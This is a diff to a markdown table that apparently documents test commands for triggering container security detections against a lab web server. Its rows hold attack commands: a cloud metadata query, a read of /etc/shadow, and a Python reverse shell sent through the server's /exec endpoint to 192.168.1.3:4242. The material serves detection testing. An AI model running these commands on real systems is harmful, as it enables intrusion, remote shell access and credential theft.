@@ -76,4 +76,4 @@ export WEBSERVERIP=192.168.1.15
 |---|---|
 | Contact Azure Instance Metadata Service from Container | `curl -X POST http://$WEBSERVERIP/exec -d 'command=curl http://169.254.169.254/metadata/instance'` |
 | Read sensitive file untrusted | `curl http://$WEBSERVERIP/etc/shadow` |
-| Redirect STDOUT/STDIN to Network Connection in Container | `curl -X POST ${WEBSERVERIP}/exec -d command="python -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.3\",4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"` |
+| Redirect STDOUT/STDIN to Network Connection in Container | `curl -X POST http://${WEBSERVERIP}/exec -d command="python -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.3\",4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"` |
